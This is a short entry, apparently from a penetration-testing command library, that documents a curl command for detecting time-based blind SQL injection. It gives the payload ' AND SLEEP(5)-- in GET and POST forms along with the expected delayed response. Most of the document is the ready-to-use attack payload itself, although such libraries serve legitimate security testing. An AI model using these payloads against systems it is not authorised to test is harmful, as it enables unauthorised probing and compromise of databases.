---
data: 'curl "https://████?███=value'' AND SLEEP(5)--" -w "%{time_total}s\n"'
tags:
  - sqli
  - injection
  - timing
type: command
output: 'Delayed response time (e.g., 5.123s)'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:04.886Z'
id: ed85ffe5-27c0-4853-8bc2-34b1e7e3eef9
verified: false
validated: true
submitted: true
---
# curl-sleep-injection

## Command

```bash
curl "https://████?███=value' AND SLEEP(5)--" -w "%{time_total}s\n"
```

## Description

This command tests for time-based blind SQL injection by sending an HTTP GET request with a sleep payload in the vulnerable parameter, measuring response time to detect delays caused by database execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with injected payload | Yes |
| -w "%{time_total}s\n" | Outputs total response time in seconds | Yes |

## Examples

### Basic Usage

```bash
curl "https://example.com/search?q=' AND SLEEP(5)--" -w "%{time_total}s\n"
```

### Advanced Usage

```bash
curl -X POST -d "param=' AND SLEEP(5)--" https://example.com/api -w "%{time_total}s\n"
```

## Expected Output

A delayed HTTP response (e.g., total time ~5 seconds) followed by the page content, indicating the SQL sleep function executed successfully.

## Related

- [[Related Procedure: Confirm-Time-Based-SQL-Injection-with-Sleep]]
